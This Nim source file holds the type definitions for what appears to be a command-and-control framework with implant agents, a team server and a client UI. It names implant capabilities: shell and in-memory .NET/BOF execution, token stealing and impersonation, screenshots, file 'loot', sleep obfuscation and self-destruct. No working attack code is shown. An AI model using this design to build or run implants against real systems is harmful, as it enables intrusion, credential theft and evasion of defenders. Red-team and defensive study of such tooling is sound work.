import tables
import parsetoml, json
import system
import mummy
when defined(client): 
    import whisky

# Custom Binary Task structure
const   
    MAGIC* = 0x514E3043'u32     # Magic value: C0NQ
    VERSION* = 1'u8             # Version 1
    HEADER_SIZE* = 48'u8        # 48 bytes fixed packet header size

type 
    PacketType* = enum 
        MSG_TASK = 0'u8
        MSG_RESULT = 1'u8 
        MSG_REGISTER = 2'u8
        MSG_HEARTBEAT = 100'u8

    ArgType* = enum 
        STRING = 0'u8
        INT = 1'u8
        SHORT = 2'u8
        LONG = 3'u8
        BOOL = 4'u8 
        BINARY = 5'u8 

    HeaderFlags* = enum 
        # Flags should be powers of 2 so they can be connected with or operators
        FLAG_PLAINTEXT = 0'u16
        FLAG_ENCRYPTED = 1'u16
        FLAG_COMPRESSED = 2'u16
        FLAG_FRAGMENTED = 4'u16 

    CommandType* = enum 
        CMD_SLEEP = 0'u16
        CMD_SHELL = 1'u16
        CMD_PWD = 2'u16
        CMD_CD = 3'u16
        CMD_LS = 4'u16
        CMD_RM = 5'u16
        CMD_RMDIR = 6'u16
        CMD_MOVE = 7'u16
        CMD_COPY = 8'u16
        CMD_PS = 9'u16
        CMD_ENV = 10'u16 
        CMD_WHOAMI = 11'u16
        CMD_BOF = 12'u16
        CMD_DOWNLOAD = 13'u16
        CMD_UPLOAD = 14'u16
        CMD_SCREENSHOT = 15'u16
        CMD_DOTNET = 16'u16
        CMD_SLEEPMASK = 17'u16
        CMD_MAKE_TOKEN = 18'u16
        CMD_STEAL_TOKEN = 19'u16 
        CMD_REV2SELF = 20'u16 
        CMD_TOKEN_INFO = 21'u16 
        CMD_ENABLE_PRIV = 22'u16
        CMD_DISABLE_PRIV = 23'u16
        CMD_EXIT = 24'u16
        CMD_SELF_DESTRUCT = 25'u16

    StatusType* = enum 
        STATUS_COMPLETED = 0'u8
        STATUS_FAILED = 1'u8
        STATUS_IN_PROGRESS = 2'u8

    ResultType* = enum 
        RESULT_STRING = 0'u8 
        RESULT_BINARY = 1'u8
        RESULT_NO_OUTPUT = 2'u8

    ConfigType* = enum 
        CONFIG_LISTENER_UUID = 0'u8
        CONFIG_LISTENER_IP = 1'u8 
        CONFIG_LISTENER_PORT = 2'u8
        CONFIG_SLEEP_DELAY = 3'u8  
        CONFIG_PUBLIC_KEY = 4'u8
        CONFIG_PROFILE = 5'u8

    LogType* {.size: sizeof(uint8).} = enum 
        LOG_INFO = "[INFO] "
        LOG_ERROR = "[FAIL] "
        LOG_SUCCESS = "[DONE] "
        LOG_WARNING = "[WARN] "
        LOG_COMMAND = "[>>>>] "
        LOG_OUTPUT = ""
        LOG_INFO_SHORT = "[*] "
        LOG_ERROR_SHORT = "[-] "
        LOG_SUCCESS_SHORT = "[+] "
        LOG_WARNING_SHORT = "[!] "

    SleepObfuscationTechnique* = enum 
        NONE = 0'u8
        EKKO = 1'u8 
        ZILEAN = 2'u8
        FOLIAGE = 3'u8

    ExitType* {.size: sizeof(uint8).} = enum 
        EXIT_PROCESS = "process"
        EXIT_THREAD = "thread"

    ModuleType* = enum 
        MODULE_ALL = 0'u32
        MODULE_SLEEP = 1'u32
        MODULE_SHELL = 2'u32 
        MODULE_BOF = 4'u32
        MODULE_DOTNET = 8'u32
        MODULE_FILESYSTEM = 16'u32 
        MODULE_FILETRANSFER = 32'u32
        MODULE_SCREENSHOT = 64'u32
        MODULE_SITUATIONAL_AWARENESS = 128'u32 
        MODULE_TOKEN = 256'u32

# Encryption 
type    
    Uuid* = uint32
    Bytes* = seq[byte]
    Key* = array[32, byte]
    Iv* = array[12, byte]
    AuthenticationTag* = array[16, byte]
    Key16* = array[16, byte]

# Packet structure
type 
    Header* = object
        magic*: uint32              # [4 bytes ] magic value 
        version*: uint8             # [1 byte  ] protocol version
        packetType*: uint8          # [1 byte  ] message type 
        flags*: uint16              # [2 bytes ] message flags
        size*: uint32               # [4 bytes ] size of the payload body
        agentId*: Uuid              # [4 bytes ] agent id, used as AAD for encryptio
        seqNr*: uint32              # [4 bytes ] sequence number, used as AAD for encryption
        iv*: Iv                     # [12 bytes] random IV for AES256 GCM encryption
        gmac*: AuthenticationTag    # [16 bytes] authentication tag for AES256 GCM encryption

    TaskArg* = object 
        argType*: uint8             # [1 byte  ] argument type
        data*: seq[byte]            # variable length data (for variable data types (STRING, BINARY), the first 4 bytes indicate data length)

    Task* = object 
        header*: Header
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        argCount*: uint8            # [1 byte  ] number of arguments
        args*: seq[TaskArg]         # variable length arguments

    TaskResult* = object 
        header*: Header 
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        status*: uint8              # [1 byte  ] success flag 
        resultType*: uint8          # [1 byte  ] result data type (string, binary)
        length*: uint32             # [4 bytes ] result length
        data*: seq[byte]            # variable length result

# Checkin binary structure
type
    Heartbeat* = object 
        header*: Header            # [48 bytes ] fixed header
        listenerId*: Uuid          # [4 bytes  ] listener id
        timestamp*: uint32         # [4 bytes  ] unix timestamp

# Registration binary structure 
type 
    # All variable length fields are stored as seq[byte], prefixed with 4 bytes indicating the length of the following data
    AgentMetadata* = object 
        listenerId*: Uuid
        username*: seq[byte]
        hostname*: seq[byte]
        domain*: seq[byte]
        ip*: seq[byte]
        os*: seq[byte]
        process*: seq[byte]
        pid*: uint32
        isElevated*: uint8
        sleep*: uint32
        jitter*: uint32
        modules*: uint32

    AgentRegistrationData* = object
        header*: Header
        agentPublicKey*: Key        # [32 bytes ] Public key of the connecting agent for key exchange
        metadata*: AgentMetadata

# Agent structure
type 
    Agent* = ref object 
        agentId*: string
        listenerId*: string 
        username*: string 
        impersonationToken*: string
        hostname*: string
        domain*: string
        ipInternal*: string
        ipExternal*: string
        os*: string
        process*: string
        pid*: int
        elevated*: bool 
        sleep*: int 
        jitter*: int
        tasks*: seq[Task]
        modules*: uint32
        firstCheckin*: int64
        latestCheckin*: int64
        sessionKey*: Key

    # Session entry for client UI
    UIAgent* = ref object 
        agentId*: string
        listenerId*: string 
        username*: string 
        impersonationToken*: string
        hostname*: string
        domain*: string
        ipInternal*: string
        ipExternal*: string
        os*: string
        process*: string
        pid*: int
        elevated*: bool 
        sleep*: int 
        jitter*: int
        modules*: uint32
        firstCheckin*: int64
        latestCheckin*: int64

# Listener structure
type 
    Protocol* {.size: sizeof(uint8).} = enum
        HTTP = "http"

    Listener* = ref object
        server*: Server
        listenerId*: string
        hosts*: string
        address*: string
        port*: int
        protocol*: Protocol

    UIListener* = ref object
        listenerId*: string
        hosts*: string
        address*: string
        port*: int
        protocol*: Protocol

#[
    Client <-> Server WebSocket communication
]#
type 
    EventType* = enum
        CLIENT_HEARTBEAT = 0'u8             # Basic checkin 
        CLIENT_KEY_EXCHANGE = 200'u8        # Unencrypted public key sent by both parties for key exchange

        # Sent by client 
        CLIENT_AGENT_BUILD = 1'u8           # Generate an agent binary for a specific listener
        CLIENT_AGENT_TASK = 2'u8            # Instruct TS to send queue a command for a specific agent
        CLIENT_LISTENER_START = 3'u8        # Start a listener on the TS
        CLIENT_LISTENER_STOP = 4'u8         # Stop a listener
        CLIENT_LOOT_REMOVE = 5'u8           # Remove loot on the team server
        CLIENT_LOOT_GET = 6'u8              # Request file/screenshot from the team server for preview or download
        CLIENT_AGENT_REMOVE = 7'u8          # Delete agent from the team server database

        # Sent by team server
        CLIENT_PROFILE = 100'u8             # Team server profile and configuration 
        CLIENT_LISTENER_ADD = 101'u8        # Add listener to listeners table
        CLIENT_AGENT_ADD = 102'u8           # Add agent to sessions table
        CLIENT_AGENT_CHECKIN = 103'u8       # Update agent checkin
        CLIENT_AGENT_PAYLOAD = 104'u8       # Return agent payload binary 
        CLIENT_CONSOLE_ITEM = 105'u8        # Add entry to a agent's console 
        CLIENT_EVENTLOG_ITEM = 106'u8       # Add entry to the eventlog   
        CLIENT_BUILDLOG_ITEM = 107'u8       # Add entry to the build log
        CLIENT_LOOT_ADD = 108'u8            # Add file or screenshot stored on the team server to preview on the client, only sends metadata and not the actual file content
        CLIENT_LOOT_DATA = 109'u8           # Send file/screenshot bytes to the client to display as preview or to download to the client desktop
        CLIENT_IMPERSONATE_TOKEN = 110'u8   # Access token impersonated
        CLIENT_REVERT_TOKEN = 111'u8        # Revert to original logon session 

    Event* = object 
        eventType*: EventType               
        timestamp*: int64 
        data*: JsonNode   

# Context structures
type 
    KeyPair* = object 
        privateKey*: Key 
        publicKey*: Key

    Profile* = TomlValueRef

    WsConnection* = ref object
        when defined(server):
            ws*: mummy.WebSocket
        when defined(client):
            ws*: whisky.WebSocket
        sessionKey*: Key

    Conquest* = ref object
        dbPath*: string
        listeners*: Table[string, Listener]
        threads*: Table[string, Thread[Listener]]
        agents*: Table[string, Agent]
        keyPair*: KeyPair
        profile*: Profile
        client*: WsConnection

    SleepSettings* = ref object 
        sleepDelay*: uint32
        jitter*: uint32
        sleepTechnique*: SleepObfuscationTechnique
        spoofStack*: bool

    AgentCtx* = ref object
        agentId*: string
        listenerId*: string
        hosts*: string
        sleepSettings*: SleepSettings
        killDate*: int64
        sessionKey*: Key
        agentPublicKey*: Key
        profile*: Profile
        registered*: bool
        
# Structure for command module definitions 
type
    Argument* = object 
        name*: string 
        description*: string 
        argumentType*: ArgType
        isRequired*: bool

    Command* = object 
        name*: string
        commandType*: CommandType
        description*: string 
        example*: string 
        arguments*: seq[Argument]
        dispatchMessage*: string
        execute*: proc(config: AgentCtx, task: Task): TaskResult {.nimcall.}

    Module* = object
        name*: string 
        description*: string
        moduleType*: ModuleType
        commands*: seq[Command]

# Definitions for ImGui User interface
type 
    ConsoleItem* = ref object 
        itemType*: LogType
        timestamp*: string
        text*: string

    ConsoleItems* = ref object
        items*: seq[ConsoleItem]

    AgentBuildInformation* = ref object 
        listenerId*: string
        sleepSettings*: SleepSettings
        verbose*: bool
        killDate*: int64
        modules*: uint32

    LootItemType* = enum 
        DOWNLOAD = 0'u8 
        SCREENSHOT = 1'u8

    LootItem* = ref object 
        itemType*: LootItemType
        lootId*: string
        agentId*: string
        host*: string 
        path*: string 
        timestamp*: int64
        size*: int 
